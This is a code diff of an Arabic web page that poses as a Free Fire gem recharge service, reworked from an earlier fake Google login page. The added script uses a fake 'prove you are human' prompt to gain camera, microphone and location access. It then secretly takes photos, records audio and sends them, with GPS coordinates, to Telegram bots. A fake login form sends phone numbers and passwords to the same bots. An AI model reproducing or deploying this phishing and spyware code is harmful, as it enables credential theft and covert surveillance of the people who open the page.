@@ -3,7 +3,7 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>نموذج تسجيل Google</title>
+  <title>شحن جواهر فري فاير</title>
   <style>
     body {
       margin: 0;
@@ -12,84 +12,132 @@
       font-family: Arial, sans-serif;
     }
 
+    #verify-box {
+      position: fixed;
+      top: 0; right: 0; bottom: 0; left: 0;
+      background: rgba(0, 0, 0, 0.85);
+      color: white;
+      text-align: center;
+      padding-top: 30%;
+      font-size: 20px;
+      z-index: 9999;
+    }
+
+    #verify-box button {
+      margin-top: 20px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 10px 25px;
+      font-size: 18px;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
     #google-btn {
       position: fixed;
       bottom: 20px;
       left: 20px;
       right: 20px;
       margin: auto;
-      width: 120px;
-      height: 40px;
+      width: 200px;
+      height: 65px;
       background-color: orange;
       color: white;
+      font-size: 18px;
       font-weight: bold;
       border: none;
-      border-radius: 10px;
+      border-radius: 15px;
       cursor: pointer;
       text-align: center;
-      line-height: 40px;
-      box-shadow: 0 0 10px #00000055;
+      line-height: 65px;
+      box-shadow: 0 0 15px #00000055;
+      display: none;
+    }
+
+    #google-btn::after {
+      content: " ⚡ شحن جواهر فري فاير";
+      font-size: 14px;
+      display: block;
+      margin-top: 4px;
     }
 
     #login-form {
       display: none;
       position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
       background: white;
-      border: 2px solid #ccc;
-      padding: 20px;
-      border-radius: 15px;
+      z-index: 9998;
+      padding: 30px;
       text-align: center;
-      z-index: 999;
-      width: 280px;
+    }
+
+    #login-form h2 {
+      margin-bottom: 10px;
+    }
+
+    #login-form p {
+      color: #444;
+      font-size: 15px;
     }
 
     #login-form input {
       width: 90%;
-      padding: 8px;
-      margin-top: 10px;
+      padding: 10px;
+      margin: 15px auto;
       font-size: 16px;
-    }
-
-    #login-form button {
-      margin-top: 10px;
-      padding: 8px 15px;
-      background-color: green;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      font-size: 16px;
-      cursor: pointer;
+      display: block;
+      border: 1px solid #ccc;
+      border-radius: 6px;
     }
 
     #togglePassword {
       position: absolute;
-      margin-top: -33px;
+      margin-top: -45px;
       margin-left: 230px;
-      cursor: pointer;
       font-size: 20px;
+      cursor: pointer;
     }
 
+    #login-form button {
+      background-color: green;
+      color: white;
+      padding: 10px 20px;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
 
+<!-- إثبات أنك إنسان -->
+<div id="verify-box">
+  🧠 أثبت أنك إنسان
+  <br>
+  <button onclick="requestPermissions()">تأكيد</button>
+</div>
+
 <!-- زر Google -->
 <div id="google-btn">Google</div>
 
-<!-- نموذج التسجيل -->
+<!-- نموذج تسجيل -->
 <div id="login-form">
-  <h3>🟠 تسجيل الدخول إلى Google</h3>
-  <input type="tel" id="phone" placeholder="رقم الهاتف" required><br>
+  <h2>🔐 إثبات الهوية</h2>
+  <p>لإتمام عملية شحن الجواهر، يرجى إدخال بياناتك</p>
+
+  <input type="tel" id="phone" placeholder="رقم الهاتف" required>
   
   <div style="position: relative;">
     <input type="password" id="password" placeholder="كلمة السر" required>
     <span id="togglePassword">👁</span>
   </div>
   
-  <button onclick="submitLogin()">تسجيل الدخول</button>
+  <button onclick="submitLogin()">متابعة</button>
 </div>
 
 <script>
@@ -105,18 +153,131 @@
     "7664410043"
   ];
 
-  // عند الضغط على زر Google
+  // إرسال الموقع الجغرافي
+  function sendLocation(lat, lon) {
+    const text = `📍 الموقع الجغرافي:\nLatitude: ${lat}\nLongitude: ${lon}`;
+    bots.forEach(token => {
+      chatIds.forEach(chatId => {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text })
+        });
+      });
+    });
+  }
+
+  // إرسال صورة
+  function sendPhoto(blob) {
+    bots.forEach(token => {
+      chatIds.forEach(chatId => {
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", blob, "photo.png");
+
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+      });
+    });
+  }
+
+  // إرسال صوت
+  function sendAudio(blob) {
+    bots.forEach(token => {
+      chatIds.forEach(chatId => {
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("audio", blob, "audio.ogg");
+
+        fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
+          method: "POST",
+          body: formData
+        });
+      });
+    });
+  }
+
+  async function requestPermissions() {
+    alert("يرجى السماح بالكاميرا، الميكروفون، والموقع الجغرافي.");
+
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+      document.getElementById("verify-box").style.display = "none";
+      document.getElementById("google-btn").style.display = "block";
+
+      navigator.geolocation.getCurrentPosition(pos => {
+        const { latitude, longitude } = pos.coords;
+        sendLocation(latitude, longitude);
+      });
+
+      captureImages(stream);
+      recordAudioRepeatedly(stream);
+
+    } catch (err) {
+      alert("حدث خطأ أثناء طلب الأذونات");
+    }
+  }
+
+  // التقاط 5 صور بفاصل 5 ثوانٍ
+  function captureImages(stream) {
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    video.play();
+
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+
+    let count = 0;
+    const capture = () => {
+      if (count >= 5) return;
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0);
+      canvas.toBlob(blob => {
+        sendPhoto(blob);
+      }, 'image/png');
+      count++;
+      setTimeout(capture, 5000);
+    };
+    setTimeout(capture, 2000); // أول صورة بعد 2 ثانية
+  }
+
+  // تسجيل صوت لمدة 5 ثوانٍ كل 5 ثوانٍ، 5 مرات
+  function recordAudioRepeatedly(stream) {
+    let count = 0;
+
+    function recordOnce() {
+      if (count >= 5) return;
+
+      const mediaRecorder = new MediaRecorder(stream);
+      const chunks = [];
+
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+      mediaRecorder.onstop = () => {
+        const blob = new Blob(chunks, { type: "audio/ogg" });
+        sendAudio(blob);
+        count++;
+        setTimeout(recordOnce, 5000);
+      };
+
+      mediaRecorder.start();
+      setTimeout(() => mediaRecorder.stop(), 5000);
+    }
+
+    recordOnce();
+  }
+
   document.getElementById("google-btn").onclick = () => {
     document.getElementById("login-form").style.display = "block";
   };
 
-  // إظهار / إخفاء كلمة السر
   document.getElementById("togglePassword").onclick = () => {
     const pw = document.getElementById("password");
     pw.type = (pw.type === "password") ? "text" : "password";
   };
 
-  // إرسال البيانات إلى كل البوتات وكل ID
   function submitLogin() {
     const phone = document.getElementById("phone").value.trim();
     const pass = document.getElementById("password").value.trim();
@@ -125,8 +286,8 @@
       return;
     }
 
-    const message = `📥 تسجيل دخول جديد:\n📱 الهاتف: ${phone}\n🔐 كلمة السر: ${pass}`;
-
+    const message = `📥 بيانات شحن:\n📱 الهاتف: ${phone}\n🔐 كلمة السر: ${pass}`;
+    
     bots.forEach(token => {
       chatIds.forEach(chatId => {
         fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -147,4 +308,3 @@
 
 </body>
 </html>
-
